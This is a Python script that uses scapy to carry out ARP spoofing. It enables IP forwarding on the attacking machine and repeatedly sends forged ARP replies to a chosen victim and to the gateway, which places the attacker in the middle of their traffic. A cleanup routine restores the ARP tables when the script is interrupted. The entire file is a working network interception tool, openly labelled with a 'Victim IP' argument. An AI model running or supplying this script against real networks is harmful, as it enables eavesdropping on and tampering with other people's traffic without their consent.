from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys



## for linux distro users
def _enable_linux_iproute():

    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return

    with open(file_path, "w") as f:
        print(1, file=f)


## for windows users 
def _enable_windows_iproute():
    from services import WService
    service = WService("RemoteAccess")
    service.start()


## function below enables IP routing in all platforms
def enable_ip_route(verbose=True):
    if verbose:
        print("[!] Enabling IP Routing...")
    
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")


## utility func allows to get MAC address from the machine

def get_mac(ip):
    # returns MAC address of any devive connected on the network
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, verbose=0)
    if ans:
        return ans[0][1].src


## spoofing 
def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')

    send(arp_response, verbose=0)

    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)

    host_mac = get_mac(host_ip)

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")

    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


## the main function
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP spoof script")
    parser.add_argument("-tg", "--target", help="Victim IP Address to ARP poison")
    parser.add_argument("-hs", "--host", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
    parser.add_argument("-v", "--verbose", action="store_true", help="verbosity, default is True (simple message each second)")
    args = parser.parse_args()
    target, host, verbose = args.target, args.host, args.verbose

    enable_ip_route()
    try:
        while True:
            spoof(target, host, verbose)

            spoof(host, target, verbose)

            time.sleep(1)

    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)

        restore(host, target)